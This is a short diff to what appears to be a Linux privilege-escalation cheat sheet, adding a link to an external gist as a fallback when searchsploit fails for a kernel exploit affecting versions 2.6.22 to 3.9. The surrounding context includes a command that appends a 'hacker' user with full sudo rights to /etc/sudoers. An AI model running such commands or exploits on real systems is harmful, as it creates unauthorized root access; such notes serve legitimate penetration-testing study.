@@ -473,6 +473,8 @@ echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers
 ```
 uname -a or uname -r
 Works on Linux Kernel 2.6.22 < 3.9
+
+can also try the follwoing if searchsploit doesnt work https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679 
 ```
 ### Basic info
 
